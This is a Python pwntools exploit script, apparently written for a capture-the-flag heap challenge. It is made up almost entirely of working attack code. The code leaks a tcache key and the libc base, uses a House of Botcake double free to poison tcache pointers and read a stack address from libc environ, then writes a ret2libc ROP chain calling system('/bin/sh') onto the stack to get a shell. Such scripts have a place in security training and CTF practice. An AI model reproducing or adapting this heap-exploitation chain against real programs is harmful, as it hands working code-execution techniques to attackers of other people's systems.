#!/usr/bin/env python3
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        #log_level="debug",
        os="linux",
        terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
s = lambda p,a: p.send(a)
up = lambda b: int.from_bytes(b, byteorder="little")

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def create(p,index,size,value):
    ru(p,b"> ")
    sl(p,b"1")
    ru(p,b"> ")
    sl(p,b"%i" % index)
    ru(p,b"> ")
    sl(p,b"%i" % size)
    ru(p,b"> ")
    sl(p,value)

def delete(p, index):
    ru(p,b"> ")
    sl(p,b"2")
    ru(p,b"> ")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"> ")
    sl(p,b"3")
    ru(p,b"> ")
    sl(p,"%i" % index)

def leak_libc(p,l):
    view(p,8)
    data = rl(p).replace(b"Choose an option:\n",b"")
    libc_leak = up(data)
    l.address = libc_leak - 0x203b20
    log.info(f"Leaked libc {data} {hex(libc_leak)} and libc base {hex(l.address)}")
    log.info(f"Found libc environ pointer {hex(l.sym['environ'])}")


def leak_tcache_key(p):
    # Leak tcache key 
    delete(p,0)
    view(p,0)
    data =  rl(p).replace(b"Choose an option:\n",b"")

    key = up(data)
    log.info(f"Leaked tcache key {hex(key)}")

    return key


def botcake_create_chunks(p,index,size):
    log.info(f"Creating {hex(size+8)} sized chunks for house of botcake")
    # create chunks to fill tcachebins for later
    for i in range(index,index+7):
        create(p,i,size,b"Z"*(size-0x10))
    # create chunk A
    create(p,index+7,size,b"A"*0x28)
    # create chunk B
    create(p,index+8,size,b"B"*0x28)
    create(p,index+9,0x28,b"GAURD   "*4)

def botcake_free_chunks(p,index,l,size,is_leaked):
    log.info(f"Performing double free on {hex(size+8)} sized chunks for house of botcake with {index}") 
    start = index if is_leaked else index+1

    # fill up tcachebins
    for i in range(start, index+7):
            delete(p,i)

    # Delete chunk B
    delete(p,index+8)
    if not is_leaked:
        leak_libc(p,l)

    # Delete chunk A 
    delete(p,index+7)
    create(p,index+10,size,b"GARBAGE " * 4)
    # Delete chunk B again
    delete(p,index+8)

def botcake_overwrite(p,index,size,key,target,value): 
    log.info(f"Overwriting {hex(target)} with {value} using house of botcake")
    log.info(f"Tcache key {hex(key)}")
    # Overwrite fd pointer for tcache chunk
    fd = p64(target^key)
    chunk = b"D" * (size-8) + p64(size+8) + p64(size+8) + fd + p64(0xdeadbeef^key)
    create(p,index+11,(size+0x20),chunk)
    create(p,index+12,size,b"")
    # Write value to new controlled chunk
    create(p,index+13,size,value)


def exploit(p,e,l):
    # Stage 1 
    # Use House of Botcake to read libc environ
    # to leak the stack
    # Fill up tcache 0x100 bin
    i = 0
    size = 0xf8
    botcake_create_chunks(p,i,size)

    # Leak tcache key 
    key = leak_tcache_key(p)
    botcake_free_chunks(p,i,l,size,False)

    # Overwrite fd of tcache chunk with libc environ
    # to leak stack
    libc_environ = l.sym["environ"] 
    fd = libc_environ-0x18

    botcake_overwrite(p,i,size,key,fd,b"A"*0x18)

    # view libc.environ from overwritten chunk
    view(p,13)
    ru(p,b"A"*0x18)
    stack_leak = up(p.recv(6))
    log.info(f"Received stack leak {hex(stack_leak)} from {hex(libc_environ)}")
   
    # Stage 2 
    # Use house of botcake to write ROP chain to stack
    # Restart house of botcake clear unsortedbins
    # and set starting index
    create(p,14,0xd8,b"Z"*0x40)
    i = 15

    # Setup ROP chain for ret2libc
    r = ROP(l)
    chain = p64(r.find_gadget(["ret"])[0]) * 18
    chain += p64(r.find_gadget(["pop rdi", "ret"])[0]) + p64(next(l.search(b"/bin/sh\x00")))
    chain += p64(l.sym["system"])

    log.info(f"System {hex(l.sym['system'])}")

    size = 0x118
    key += 1    
    ret_addr = stack_leak - 0x15a
    # Test out different offsets from the stack to get right
    botcake_create_chunks(p,i,size)
    botcake_free_chunks(p,i,l,size,True)
    #botcake_overwrite(p,i,size,key,ret_addr,cyclic(size))
    botcake_overwrite(p,i,size,key,ret_addr,chain)

    log.info(f"Stack leak {hex(stack_leak)} writing to {hex(ret_addr)} with {hex(ret_addr - stack_leak)} difference")

    p.interactive()
    
if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
